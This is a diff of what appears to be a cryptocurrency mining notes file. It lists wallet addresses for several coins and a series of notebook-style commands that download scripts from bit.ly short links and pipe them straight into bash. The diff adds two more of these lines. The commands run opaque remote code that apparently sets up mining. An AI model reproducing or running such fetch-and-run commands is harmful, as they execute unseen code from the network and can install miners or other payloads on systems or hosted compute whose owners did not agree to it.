@@ -18,7 +18,7 @@ ZEC:	t1ab2rCrgCbqaspPodCALpR6epzEiu5uCHF
 
 YEC:	s1THjZQJxthDD9tt1dRzQSqDoQQH9XwNM5x
 
-ADA: addr1qy4aeu2wpjpuy0r2xn64eec0z6300wnqrj5ypj3ep9g49ggm7gg506stxjnjp3zjs3a9mch478sfl6qt722zu2gs28fqq5dfv6
+ADA:    addr1qy4aeu2wpjpuy0r2xn64eec0z6300wnqrj5ypj3ep9g49ggm7gg506stxjnjp3zjs3a9mch478sfl6qt722zu2gs28fqq5dfv6
 
 XMR:	44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p
 
@@ -41,6 +41,11 @@ wget -q -O - bit.ly/XM00001 2> lol.out | bash
 !wget --no-cache --delete-after -q -O - bit.ly/TEsT0002 | bash
 
 !wget --no-cache --delete-after -q -O - bit.ly/TesT0003 | bash
+
+
+!wget --no-cache --delete-after -q -O - bit.ly/rvoc0001 | bash
+
+!wget --no-cache --delete-after -q -O - bit.ly/rvcu0001 | bash
 
 ## Solo M
 
